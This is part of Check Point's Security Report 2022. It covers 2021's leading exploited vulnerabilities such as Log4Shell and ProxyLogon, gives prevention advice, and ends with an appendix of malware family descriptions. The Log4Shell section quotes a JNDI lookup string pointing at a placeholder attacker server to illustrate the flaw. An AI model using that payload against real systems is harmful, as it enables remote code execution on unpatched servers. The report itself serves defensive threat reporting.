CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   6

06

HIGH PROFILE
GLOBAL
VULNERABILITIES

 MANY VULNERABILITIES DISCOVERED IN 2017 MAINTAINED

A STRONG PRESENCE THROUGHOUT 2021 OVERSHADOWING

THE NEWLY DISCOVERED ONES

5454

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   6

The following list of top vulnerabilities is based on data collected by the Check

Point Intrusion Prevention System (IPS) sensor net and details some of the most

popular and interesting attack techniques and exploits observed by Check Point

researchers in 2021.

‘LOG4SHELL’	APACHE	LOG4J	 -	REMOTE	CODE
EXECUTION	(CVE-2021-44228)

Apache Log4j is an open-source Java-based logging package provided by the

Apache Software Foundation, as part of the Apache Logging Services. It is the

most popular Java logging library, used by millions of Java-based applications

worldwide to record activities such as routine system operations and error

messages and to send diagnostics to system admins. On December 9, the Apache

Foundation released an emergency Log4j version to address a critical flaw in the

logging framework. This flaw enables threat actors to compromise a machine by

sending it a simple string such as ‘${jndi:ldap://attacker_server/path}’ as part of

the HTTP request, User-Agent or any other input likely being logged by the server

using Log4j. By controlling the messages logged via the logging package, arbitrary

code could be executed from a remote server. Called ‘Log4Shell’, the vulnerability

took the security community by storm due to its far-reaching effects on millions

of companies, including Cisco, Twitter, Cloudflare, Tesla, Amazon and Apple, that

use Log4j. Widespread exploitation of the flaw was observed almost immediately,

both by low skilled attackers to distribute cryptominers, as well as by state

sponsored APT groups, to gain access to corporate networks. According to Check

Point Research approximately 48.3% of organizations were affected by exploitation

attempts of the Log4Shell Vulnerability in 2021.

5555

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   6

“PROXYLOGON”	MICROSOFT	EXCHANGE	SERVER	 -
AUTHENTICATION	BYPASS	(CVE-2021-26855)

ProxyLogon is the name given by researchers from DEVCORE to an authentication

bypass vulnerability (CVE-2021-26855) first discovered and reported in late 2020.

When combined with other vulnerabilities (CVE-2021-26857, CVE-2021-26858,

CVE-2021-27065), this infection chain can lead to remote code execution on any

unpatched mainstream Exchange Server. ProxyLogon has been exploited in the

wild by several APT groups. In August, Earth Baku launched a campaign in the

Indo-Pacific region using SQL injection and exploiting ProxyLogon as entry vectors.

In September, the FamousSparrow cyberespionage group exploited the flaw as well

as backdoor SparrowDoor on hotel chains, governments, private businesses and

various other sectors worldwide. Another threat group, SquirrelWaffle, was seen

hacking Microsoft Exchange servers with ProxyShell and ProxyLogon to spread

malware through malicious emails.

ATLASSIAN	CONFLUENCE	 -	REMOTE	CODE
EXECUTION	(CVE-2021-26084)

This critical Remote Code Execution in Atlassian Confluence Server or Confluence

Data Center flaw, made public in August 2021, is derived from the Object Graph

Navigation Language. It can be exploited without authentication, allowing a

remote attacker to execute arbitrary code on the affected system. Atlassian

released patches for the affected enterprises and several Proof of Concept exploits

were published. Threat actors subsequently scanned for the vulnerability with the

aim of installing cryptominers. In September, the z0Miner cryptojacker attempted

to conduct mining operations on vulnerable machines. In October, the Atom Silo

ransomware operator was observed exploiting unpatched computers to launch

ransomware attacks.

5656

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   6

2021

2020

2019

2018

2017

2016

2015

2014

2013

2012

2011

2%

5%

11%

12%

17%

7%

8%

8%

6%

10%

3%

Earlier

11%

10
Figure 34: Percentage of attacks leveraging vulnerabilities by Disclosure Year in 2021.

20

15

5

0

Many vulnerabilities discovered in 2017 maintained a strong presence throughout

2021. This is mostly due to popular flaws like the Apache Struts2 Remote Code

Execution (CVE-2017-5638), which is incorporated into the Mirai botnet, or the

PHPUnit remote code execution (CVE-2017-9841), often used to exploit vulnerable

WordPress plugins.

The 2020 vulnerabilities remained prominent, leveraged in 11% of attacks. Among

the most significant was the Draytek Vigor series buffer overflow vulnerabilities

(CVE-2020-10826, CVE-2020-10827, CVE-2020-10828), which had a 41% share of

global impact on organizations. These vulnerabilities could be leveraged to run

arbitrary code on vulnerable Draytek routers, using a specially crafted remote

HTTP request.

In 2021, we observed a slower adaptation of vulnerabilities compared to previous

years. The chart reveals that 2021 vulnerabilities were increasingly exploited by

5757

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022100%

90%

80%

70%

60%

50%

40%

30%

20%

10%

0%

JAN 21

FEB 21

MAR 21

APR 21

MAY 21

JUN 21

JUL 21

AUG 21

SEP 21

OCT 21

NOV 21

DEC 21

Figure 35: Percentage of attacks leveraging vulnerabilities by Disclosure Year per Month.

hackers from the middle of the year, corresponding with a slight decrease in the use

of CVEs from 2017.

2021

2020

2019

2018

2017

2016

2015

2014

2013

2012

2011

Older

5858

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022
C H A P T E R   7

07

PREVENTING THE
NEXT CYBER PANDEMIC—
A STRATEGY FOR
ACHIEVING BETTER
SECURITY

BY JONY FISCHBEIN

CISO for Check Point Software

59

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   7

THREAT	PREVENTION	 —	PREVENT	ATTACKS
BEFORE THEY HAPPEN

One of the biggest challenges facing security practitioners is Gen V attacks – the

combination of a wide breadth of threats, large scale attacks and a broad attack

surface. True comprehensive protection requires an architected approach that

prevents attacks before they happen. Ultimately, the goal is to defeat all attacks

across all possible vectors. A security architecture that enables and facilitates

a unified and cohesive protection infrastructure is going to provide more

comprehensive and faster protection than an infrastructure composed of pieces

that don’t work together. This is the heart of what Check Point Infinity delivers – a

security architecture to prevent attacks before they occur.

WHEN YOUR PERIMETER IS EVERY WHERE AND
ATTACKS KEEP ADVANCING, YOUR BUSINESS
NEEDS ACCURATE PREVENTION BASED ON REAL
TIME THREAT INTELLIGENCE

In the current climate of mega supply chain attacks and the constant fight against

new evolved malware, threat intelligence and rapid response capabilities are vital.

Comprehensive intelligence to proactively eliminate threats, managed security

services to monitor your network, and incident response capabilities to quickly

respond to and resolve attacks, are all crucial to keeping your business up and

running in 2022. Malware is constantly evolving, making threat intelligence an

essential tool for almost every company to consider. When an organization has

financial, personal, intellectual, or national assets to maintain and secure, a more

comprehensive approach to security is the only actual way to protect against

today’s attackers - and one of the most effective proactive security solutions

available today is threat intelligence. Threat intelligence must cover all attack

surfaces including cloud, mobile, network, endpoint, and IoT, because these

vectors are commonplace in an enterprise. Threat intelligence isn’t just data - its

practice, and it should fuel the move toward a prevention-first approach, blocking

attacks before they penetrate, gaining the best catch rate of known and unknown

threats, and achieving a near zero false positive rate, interrupting users as little

as possible.

6060

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   7

SECURE EVERYTHING, AS EVERYTHING IS A
POTENTIAL TARGET

To achieve effective coverage, organizations should seek a single solution that can

cover all attack surfaces and vectors. In a multi hybrid environment, where the

perimeter is now everywhere, security should be able to protect it all.

Email, web browsing, servers and storage are only the beginning. Mobile apps,

cloud and external storage are all essential, so is the compliance of connected

mobile and endpoint devices, and your growing IoT device estate. Workloads,

containers, and serverless applications on multi- and hybrid-cloud environments

should also be a part of the checklist at all times. With the rapid shift to cloud

and hybrid working, it’s become even more important to have a robust breach

prevention strategy.

LEVERAGING A COMPLETE UNIFIED
ARCHITECTURE

Comprehensive visibility across your entire network estate, gained through

consolidation, is now essential when it comes to guarding against increasingly

sophisticated attacks.

Many companies attempt to build their security using a patchwork of single-

purpose products from multiple vendors, but often fail and are left with security

gaps caused by disjointed technologies. This approach also produces a huge

overhead because it relies on working with multiple systems and vendors instead

of one integrated solution. In order to achieve complete inclusive security,

companies should therefore adopt a unified multi-layer approach that protects all

IT elements, including networks, endpoints, cloud, mobile and IoT, all sharing the

same prevention architecture and being fed the same threat intelligence data in

real time.

6161

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   7

BIOLOGICAL PANDEMIC VS. CYBER PANDEMIC
Similarities and Parallelization, Lessons Learned

BIOLOGICAL PANDEMIC

CYBER PANDEMIC

INFECTION RATE
Virus infection rate (Ro) (source: WHO)
The average number of people that one person
with a virus infects:
Flu: 1.3, SARS: 2-4, Corona: 2.5,
Ebola: 1.6-2, Zika: 2-6.6, Measles: 11-18

INFECTION PREVENTION
Best treatment: Vaccination
Dealing with Infection Best Practices:
1)  Quarantine, Shelter-in-Place
2)  Isolation
3)  Contact Tracing

SAFETY BEST PRACTICES
Common treatment (until vaccination):
1)  Mask
2)  Hygiene
3)  Social Distancing

INFECTION RATE
Malware infection rate (Ro) The average number
of hosts that one host with a malware infects:
Cyber attack: >27 (source: WEF, NSTU)
Slammer: Doubled in size every 8.5 seconds
Code Red: 2,000 new hosts per minute

INFECTION PREVENTION
Best treatment: Real Time Prevention
Best Practices: Continuous process of:
1)  Quarantine: Sandboxing, Micro-Segmentation
2)  Isolation: Zero Trust, Segregation
3)  Tracing: Threat Intelligence, AI, SOC,
      Posture Management

SAFETY BEST PRACTICES
1)  Awareness: Think before you click…
2)  Cyber Hygiene: Patches, Compliance…
3)  Asset Distancing: Network Segmentation,
      Multi-Factor Authentication…

MAINTAIN SECURITY
HYGIENE

∙	 Patching: All too often, attacks are able to

penetrate defenses by leveraging known

vulnerabilities for which a patch exists but

has not been applied. Organizations should

strive to make sure up-to-date security

patches are maintained across all systems

and software.

∙	 Educate Employees to Recognize Potential

Threats: User education has always been a

key element in avoiding malware infections.

The basics of knowing where files came

from, why the employee is receiving them,

and whether or not they can trust the sender

continue to be useful tools your employees

should use before opening files and emails.

The most common infection methods used in

ransomware campaigns are still spam and

∙	 Segmentation: Networks should be

phishing emails. Quite often, user awareness

segmented, applying strong firewall and IPS

can prevent an attack before it occurs. Take

safeguards between the network segments in

the time to educate your users, and ensure

order to contain infections from propagating

that if they see something unusual, they

across the entire network.

report it to your security teams immediately.

6262

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   7

∙	 Review: Security products’ policies must

numerous more. Each of these technologies

be carefully reviewed, and incident logs and

can be highly effective in specific scenarios,

alerts should be continuously monitored.

covering specific file types or attack vectors.

∙	 Audit: Routine audits and penetration testing

should be conducted across all systems.

∙	 Principle of Least Privilege: User and

software privileges should be kept to a

minimum – is there really a need for all users

to have local admin rights on their devices?

Strong solutions integrate a wide range of

technologies and innovations in order to

effectively combat modern attacks in IT

environments. In addition to traditional,

signature-based protections like antivirus

and IPS, organizations need to incorporate

additional layers to prevent against new,

unknown malware that has no known

∙	 Implementing the most advanced security

signature. Two key components to consider

technologies: There is no single silver-

are threat extraction (file sanitization) and

bullet technology that can protect from all

threat emulation (advanced sandboxing). Each

threats and all threat vectors. However,

element provides distinct protection that,

there are many great technologies and ideas

when used together, offer a comprehensive

available – machine learning, sandboxing,

solution for protection against unknown

anomaly detection, content disarmament, and

malware at the network level and directly on

endpoint devices.

6363

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CONCLUSION

As predicted, in a year that began with the fallout from one of the most devastating

supply chain attacks in history, we’ve seen threat actors grow in confidence and

sophistication. By the end of the year, this culminated in the Log4j vulnerability

exploit, which yet again caught the security community off guard and brought to

the fore the sheer level of risk inherent to software supply chains. In the months

between, we saw cloud services under attack, threat actors increasing their focus

on mobile devices, the Colonial Pipeline held to ransom, and the resurgence of one

of the most dangerous botnets in history.

But it’s not all doom and gloom. We also saw cracks in the ransomware ecosystem

widen in 2021, as governments and law enforcement agencies around the world

resolved to take a tougher stance on ransomware groups in particular. Instead of

relying on reactive and remedial action, some shocking events woke governments

up to the fact that they needed to take a more pre-emptive, proactive approach

to dealing with cyber risk. That same philosophy extends to businesses too, who

can no longer afford to take a disjointed, siloed, reactionary approach to dealing

with threats. They need 360-degree visibility, real-time threat intelligence, and a

security infrastructure that can be mobilized in an effective, joined-up manner.

64

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022APPENDIX
MALWARE FAMILY DESCRIPTIONSS

6565

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022AgentTesla
AgentTesla is an advanced RAT which functions as a keylogger and password stealer
and has been active since 2014. AgentTesla can monitor and collect the victim's
keyboard input and system clipboard, and can record screenshots and exfiltrate
credentials for a variety of software installed on a victim's machine (including
Google Chrome, Mozilla Firefox and Microsoft Outlook email client). AgentTesla is
sold on various online markets and hacking forums.

AlienBot
AlienBot is a banking Trojan for Android, sold underground as Malware-as-a-Service
(MaaS). It supports keylogging, dynamic overlays for credentials theft, as well as
SMS harvesting for 2FA bypass. Additional remote control capabilities are provided
using a TeamViewer module.

Bazar
Discovered in 2020, Bazar Loader and Bazar Backdoor are used in the initial stages
of infection by the WizardSpider cybercrime gang. The loader is responsible for
fetching the next stages, and the backdoor is meant for persistence. The infections
are usually followed by a full-scale ransomware deployment, using Conti or Ryuk.

CryptoBot
CryptoBot is an advanced cryptominer that collects the victim’s wallet and account
information upon infection. In December 2021 CryptoBot was observed in a
campaign that targeted users with a pirated copy of the Windows operating system.

Cl0p
Cl0p is a ransomware that was first discovered in early 2019 and mostly targets
large firms and corporations. During 2020, Cl0p operators began exercising a
double-extortion strategy, where in addition to encrypting the victim's data, the
attackers also threaten to publish stolen information unless ransom demands are
met. In 2021 Cl0p ransomware was used in numerous attacks where the initial
access was gained by utilizing zero-day vulnerabilities in the Accellion File Transfer
Appliance.

66

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022DanaBot
DanaBot is a modular banking Trojan written in Delphi that targets the Windows
platform. The malware, which was first observed in 2018, is distributed via
malicious spam emails. Once a device is infected, the malware downloads updated
configuration code and other modules from the C&C server. Available modules
include a “sniffer” to intercept credentials, a “stealer” to steal passwords from
popular applications, a “VNC” module for remote control, and more.

DarkGate
DarkGate is a multifunction malware active since December 2017 which combines
ransomware, credential stealing, and RAT and cryptomining abilities. Targeting
mostly the Windows OS, DarkGate employs a variety of evasion techniques.

Dridex
Dridex is a Banking Trojan turned botnet, that targets the Windows platform. It is
delivered by spam campaigns and Exploit Kits, and relies on WebInjects to intercept
and redirect banking credentials to an attacker-controlled server. Dridex contacts a
remote server, sends information about the infected system, and can also download
and execute additional modules for remote control.

Emotet
Emotet is an advanced, self-propagating and modular Trojan. Emotet was once used
to employ as a banking Trojan, and now is used as a distributer for other malware
or malicious campaigns. It uses multiple methods for maintaining persistence and
evasion techniques to avoid detection. In addition, Emotet can also be spread through
phishing spam emails containing malicious attachments or links.

FluBot
FluBot is an Android malware distributed via phishing SMS messages (SMiShing),
most often impersonating logistics delivery brands. Once the user clicks the link
inside the message, they are redirected to the download of a fake application
containing FluBot. Once installed the malware has various capabilities to harvest
credentials and support the Smishing operation itself, including uploading of the
contacts list, as well as sending SMS messages to other phone numbers.

67

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022FlyTrap
FlyTrap is an Android Trojan built to steal Facebook credentials, location, email
address, IP and more. The Trojan originally spread via fake Android apps on Google
Play, encouraging the users to login to their Facebook account. At this stage FlyTrap
uses JavaScript injection to hijack the session, and sends its details to the C&C
server, allowing the attackers to gain access to the Facebook account, from a remote
location.

FormBook
FormBook is an Infostealer targeting the Windows OS and was first detected in 2016.
It is marketed as Malware-as-a-service (MaaS) in underground hacking forums
for its strong evasion techniques and relatively low price. FormBook harvests
credentials from various web browsers, collects screenshots, monitors and logs
keystrokes, and can download and execute files according to orders from its C&C.

Glupteba
Known since 2011, Glupteba is a Windows backdoor which gradually matured into a
botnet. By 2019 it included a C&C address update mechanism through public BitCoin
lists, an integral browser stealer capability and a router exploiter.

Hiddad
Android malware which repackages legitimate apps and then releases them to a
third-party store. Its main function is displaying ads, but it also can gain access to
key security details built into the OS.

IcedID
IcedID is a banking Trojan which first emerged in September 2017. It spreads by mail
spam campaigns and often uses other malwares like Emotet to help it proliferate.
IcedID uses evasive techniques like process injection and steganography, and steals
user financial data via both redirection attacks (installs a local proxy to redirect
users to fake-cloned sites) and web injection attacks.

Kinsing
Discovered in 2020, Kinsing is a Golang cryptominer with a rootkit component.
Originally designed to exploit Linux systems, Kinsing was installed on compromised
servers by abusing vulnerabilities on internet facing services. Later in 2021 a
Windows variant of the malware was developed as well, allowing the attackers to
increase their attack surface.

68

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022LemonDuck
LemonDuck is a cryptominer first discovered in 2018, which targets Windows
systems. It has advanced propagation modules, including sending malspam, RDP
brute-forcing and mass-exploitation via known vulnerabilities such as BlueKeep.
Over time it was observed to harvest emails and credentials, as well as to deliver
other malware families, like Ramnit.

LokiBot
LokiBot is commodity infostealer for Windows. It harvests credentials from a variety
of applications, web browsers, email clients, IT administration tools such as PuTTY,
and more. LokiBot has been sold on hacking forums and believed to have had its
source code leaked, thus allowing for a range of variants to appear. It was first
identified in February 2016.

Mirai
Mirai is an infamous Internet-of-Things (IoT) malware that tracks vulnerable IoT
devices, such as web cameras, modems and routers, and turns them into bots. The
botnet is used by its operators to conduct massive distributed denial-of-service
(DDoS) attacks. The Mirai botnet first surfaced in September 2016 and quickly made
headlines due to some large-scale attacks including a massive DDoS attack used to
knock the entire country of Liberia offline, and a DDoS attack against the Internet
infrastructure firm Dyn, which provides a significant portion of the United States
internet's infrastructure.

MyloBot
Mylobot is a sophisticated botnet that first emerged in June 2018 and is equipped
with complex evasion techniques including anti-VM, anti-sandbox, and anti-
debugging techniques. The botnet allows an attacker to take complete control of the
user's system, downloading any additional payload from its C&C.

NanoCore
NanoCore is a Remote Access Trojan that targets Windows operating system users
and was first observed in the wild in 2013. All versions of the RAT contain basic
plugins and functionalities such as screen capture, cryptocurrency mining, remote
control of the desktop and webcam session theft.

69

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022NRSMiner
NSRMiner is a cryptominer that surfaced around November 2018, and was mainly
spread in Asia, specifically Vietnam, China, Japan and Ecuador. After the initial
infection, it uses the famous EternalBlue SMB exploit to propagate to other
vulnerable computers in internal networks and eventually starts mining the Monero
(XMR) Cryptocurrency.

Pegasus
Pegasus is a highly sophisticated spyware which targets Android and iOS mobile
devices, developed by the Israeli NSO group. The malware is offered for sale,
mostly to government-related organizations and corporates. Pegasus can leverage
vulnerabilities which allow it to silently jailbreak the device and install the malware.
The malware infects its targets via several means: Spear phishing SMS messages
which contains a malicious link or URL redirect, without any action required from
the user (“Zero Click”), and more. The app features multiple spying modules such as
screenshot taking, call recording, access to messaging applications, keylogging and
browser history exfiltration.

Phorpiex
Phorpiex (aka Trik) is a botnet (aka Trik) that has been active since 2010 and at its
peak controlled more than a million infected hosts. It is known for distributing other
malware families via spam campaigns as well as fueling large-scale spam and
sextortion campaigns.

Qbot
Qbot AKA QakBot is a banking Trojan that first appeared in 2008. It was designed to
steal a user’s banking credentials and keystrokes. Often distributed via spam email,
Qbot employs several anti-VM, anti-debugging, and anti-sandbox techniques to
hinder analysis and evade detection.

Raccoon
Raccoon infostealer was first observed in April 2019. This infostealer targets
Windows systems and is sold as a MaaS (Malware-as-a-Service) in underground
forums. It is a simple infostealer capable of collecting browser cookies, history,
login credentials, cryptocurrency wallets and credit card information.

Ragnar Locker
Ragnar Locker is a ransomware first discovered in Dec. 2019. It deploys
sophisticated evasion techniques including deployment as a virtual machine on
targeted systems to hide its activity. Ragnar was used in an attack against Portugal’s
national electric company in a double-extortion act where the attackers published
sensitive data stolen from the victim.

70

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022Ramnit
Ramnit is a modular banking Trojan first discovered in 2010. Ramnit steals web
session information, giving its operators the ability to steal account credentials for
all services used by the victim, including bank accounts, and corporate and social
networks accounts. The Trojan uses both hardcoded domains as well as domains
generated by a DGA (Domain Generation Algorithm) to contact the C&C server and
download additional modules.

RedLine Stealer
RedLine Stealer is a trending Infostealer and was first observed in March 2020.
Sold as a MaaS (Malware-as-a-Service), and often distributed via malicious email
attachments, it has all the capabilities of modern infostealer - web browser
information collection (credit card details, session cookies and autocomplete data),
harvesting of cryptocurrency wallets, ability to download additional payloads,
and more.

Remcos
Remcos is a RAT that first appeared in the wild in 2016. Remcos distributes itself
through malicious Microsoft Office documents, which are attached to SPAM emails,
and is designed to bypass Microsoft Windowss UAC security and execute malware
with high-level privileges.

RigEK
The oldest and best known of the currently operating Exploit Kits, RigEK has been
around since mid-2014. Its services are offered for sale on hacking forums and the
TOR Network. Some “entrepreneurs” even re-sell low-volume infections for those
malware developers not yet big enough to afford the full-fledged service. RigEK has
evolved over the years to deliver anything from AZORult and Dridex to little-known
ransomware and cryptominers.

RubyMiner
RubyMiner was first seen in the wild in January 2018 and targets both Windows and
Linux servers. RubyMiner seeks vulnerable web servers (such as PHP, Microsoft
IIS, and Ruby on Rails) to use for cryptomining, using the open source Monero miner
XMRig.

71

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022Ryuk
Ryuk is a ransomware used by the TrickBot gang in targeted and well-planned
attacks against several organizations worldwide. The ransomware was originally
derived from the Hermes ransomware, whose technical capabilities are relatively
low, and includes a basic dropper and a straight-forward encryption scheme.
Nevertheless, Ryuk was able to cause severe damage to targeted organizations,
forcing them to pay extremely high ransom payments in Bitcoin. Unlike common
ransomware, systematically distributed via massive spam campaigns and Exploit
Kits, Ryuk is used exclusively in tailored attacks.

Snake Keylogger
Snake Keylogger is a modular .NET keylogger/infostealer. Surfaced around late
2020, it grew fast in popularity among cyber criminals. Snake is capable of recording
keystrokes, taking screenshots, harvesting credentials and clipboard content. It
supports exfiltration of the stolen data by both HTTP and SMTP protocols.

REvil
REvil (aka Sodinokibi) is a Ransomware-as-a-service which operates an “affiliates”
program and was first spotted in the wild in 2019. REvil encrypts data in the user’s
directory and deletes shadow copy backups to make data recovery more difficult. In
addition, REvil affiliates use various tactics to spread it, including through spam and
server exploits, as well as hacking into managed service providers (MSP) backends,
and through malvertising campaigns that redirect to the RIG Exploit Kit.

SparrowDoor
SparrowDoor is an advanced backdoor used by the FamousSparrow APT group to spy
on hotels, governments and more. It was spotted exploiting the Microsoft Exchange
ProxyLogon vulnerability around March 2021. The backdoor is loaded using DLL
Hijacking combined with a legitimate binary, to help bypass AV products.

SunBurst
SunBurst is the backdoor that was planted within SolarWinds’s Orion IT management
software during 2020, as part of the infamous supply chain attack, hitting thousands
of organizations worldwide. It is a persistent backdoor that provided attackers with
an initial foothold within the organizations. If the infected machines passed all the
requirements, and did not contain various blacklisted services or AV software,
Sunburst would later deploy additional memory implants (like TearDrop) for
command execution and lateral movement capabilities.

72

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022Triada
Triada which was first spotted in 2016, is a modular backdoor for Android which
grants admin privileges to download another malware. Its latest version is
distributed via adware development kits in WhatsApp for Android.

TrickBot
TrickBot is a modular banking Trojan, attributed to the WizardSpider cybercrime
gang. Mostly delivered via spam campaigns or other malware families such as
Emotet and BazarLoader. TrickBot sends information about the infected system
and can also download and execute arbitrary modules from a large array of
available modules, including a VNC module for remote control and an SMB module
for spreading within a compromised network. Once a machine is infected, the
threat actors behind this malware, utilize this wide array of modules not only to
steal banking credentials from the target PC, but also for lateral movement and
reconnaissance on the targeted organization itself, prior to delivering a company-
wide targeted ransomware attack.

Ursnif
Ursnif is a variant of the Gozi banking Trojan for Windows, whose source code
has been leaked online. It has man-in-the-browser capabilities to steal banking
information and credentials for popular online services. In addition, it can steal
information from local email clients, browsers and cryptocurrency wallets. Finally,
it can download and execute additional files on the infected system.

Vidar
Vidar is an infostealer that targets Windows operating systems. First detected at the
end of 2018, it is designed to steal passwords, credit card data and other sensitive
information from various web browsers and digital wallets. Vidar is sold on various
online forums and used as a malware dropper to download GandCrab ransomware
as its secondary payload.

WannaMine
WannaMine is a sophisticated Monero cryptomining worm that spreads the
EternalBlue exploit. WannaMine implements a spreading mechanism and
persistence techniques by leveraging the Windows Management Instrumentation
(WMI) permanent event subscriptions.

73

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022xHelper
xHelper is an Android malware which mainly shows intrusive pop-up ads and
notification spam. It is very hard to remove once installed due to its reinstallation
capabilities. First observed in March 2019, xHelper has now infected more than
45,000 devices.

XMRig
XMRig is open-source CPU mining software used to mine the Monero
cryptocurrency. Threat actors often abuse this open-source software by integrating
it into their malware to conduct illegal mining on victims’ devices.

ZLoader
ZLoader is a banking malware which uses webinjects to steal credentials and private
information, and can extract passwords and cookies from the victim’s web browser.
It downloads VNC that allows the threat actors to connect to the victim’s system and
perform financial transactions from the user’s device. First seen in 2016, the Trojan
is based on leaked code of the Zeus malware from 2011. In 2020, the malware is very
popular among threat actors and includes many new variants.

z0Miner
Z0Miner, first observed in November 2020 is a cryptominer which was found on
thousands of servers exploited by Oracle’s WebLogic Server Remote Code Execution
flaw. The group behind Z0miner has since been taking advantage of the Atlassian
Confluence RCE vulnerability (CVE-2021-26084), to infect additional servers.

74

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CONTACT US

WORLDWIDE HEADQUARTERS

5 Ha’Solelim Street, Tel Aviv 67897, Israel
Tel: 972-3-753-4555 | Fax: 972-3-624-1100
Email: info@checkpoint.com

U.S. HEADQUARTERS

959 Skyway Road, Suite 300, San Carlos, CA 94070
Tel: 800-429-4391 | 650-628-2000 | Fax: 650-654-4233

UNDER ATTACK?

Contact our Incident Response Team:
emergency-response@checkpoint.com

CHECK POINT RESEARCH PODCAST
Tune in to cp<radio> to get CPR’s latest research,
plus behind the scenes and other exclusive content.
Visit us at https://research.checkpoint.com/category/cpradio/

W W W . C H E C K P O I N T . C O M

© 1994-2022 Check Point Software Technologies Ltd. All Rights Reserved.